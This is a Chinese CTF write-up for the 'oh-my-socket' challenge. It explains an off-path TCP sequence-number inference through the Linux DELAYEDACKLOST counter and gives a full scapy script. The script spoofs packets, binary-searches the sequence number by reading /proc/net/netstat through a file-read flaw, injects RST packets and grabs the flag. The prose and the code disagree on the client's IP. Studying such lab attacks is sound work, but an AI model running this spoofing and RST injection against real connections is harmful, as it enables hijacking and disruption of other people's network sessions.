# oh-my-socket-ZH

这是一道关于TCP侧信道的题，idea来源于钱志云老师的几篇关于TCP侧信道的论文，大家有兴趣的可以去[钱老师主页](https://www.cs.ucr.edu/~zhiyunq/publications.html)看一下，那首先我们来看一下这道题目。

给出的Docker环境中包含有三个容器，其中一台client主机和server主机两者建立了tcp通信，并在建立通信以后两者都处于等待状态，相互之间没有发送数据包，server主机上有flag，向server发送字符`*ctf`就可以获得flag，同时client主机上还提供一个任意文件读的功能。第三台主机提供了一个任意Python文件执行的功能，并同时提前安装了scapy库。

梳理下来有以下信息，client ip(172.21.0.2)、client port(7775)、server ip(172.21.0.2)、server port(21587)、client上的任意文件读、一台同一子网的预装了scapy库的机器任意代码执行。

那其实现在思路就比较直接了，想办法能打断client和server的通信，然后在和server连接上发送`*ctf`就可以获得flag了。最直接的思路就是构造RST攻击，并且现在我们已经了所有通信的IP和PORT，那就只需要再确定seq值就可以了，显然两分钟的执行时间内是不够我们爆破所有seq值的，所以得寻找到更加巧妙的办法。

根据上述论文中提到的侧信道方法，在我们伪装成server向client发送数据包的时候，假如此次发送的数据包seq值是小于预期要接收的seq值的话，Linux操作系统中和TCP有关的一个计时器DELAYEDACKLOST会加1，而这个计时器在`/proc/net/netstat`中可以找到，那么此时我们的攻击思路就比较明确了，伪装成server向client发送通信数据包，并同时检索DELAYEDACKLOST值的变化情况，以此作为依据来做二分查找，这样可以在很快的时间内确定seq值预期范围，然后向server主机发送RST包打断通信，最后连接上server就可以获得flag了。

参考exp如下:

```
from scapy.all import *
import requests
from socket import *


def send_ack(seq):
    TCPLayer = TCP(sport=21587, dport=7775, flags='A', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.2',dst='172.21.0.3')
    data = 'flag'
    pkt = IPLayer/TCPLayer/data
    send(pkt, verbose=0)


def send_bye(seq):
    TCPLayer = TCP(sport=7775, dport=21587, flags='A', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.3',dst='172.21.0.2')
    data = 'flag'
    pkt = IPLayer/TCPLayer/data
    send(pkt, verbose=0)


def get_num():
    url = 'http://172.21.0.3:5000/file?name=/proc/net/netstat'
    r = requests.get(url=url)
    data = r.text.split('\n')[1]
    num = data.split(' ')[19]
    return num


def send_rst(seq):
    TCPLayer = TCP(sport=21587, dport=7775, flags='R', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.2', dst='172.21.0.3')
    data = 'flag'
    pkt = IPLayer / TCPLayer / data
    send(pkt, verbose=0)


def connect():
    HOST = '172.21.0.2'
    PORT = 21587
    BUFSIZ = 1024
    ADDR = (HOST, PORT)

    tcp_socket = socket(AF_INET, SOCK_STREAM)
    tcp_socket.connect(ADDR)
    data = '*ctf'
    tcp_socket.send(data.encode())
    resp = tcp_socket.recv(BUFSIZ)
    if resp:
        print(resp.decode('utf-8'))

    tcp_socket.close()

min = 0
max = 4294967296
a = int(get_num())

while abs(max - min) > 1:
    mid = (max + min) // 2
    send_ack(mid)
    num = int(get_num())

    if num - a == 1:
        min = mid
        a = num
    else:
        max = mid

ans = max

# start to rst attack
for i in range(ans - 30, ans + 30):
    send_rst(i)

# start connect to server
send_bye(ans)
connect()
```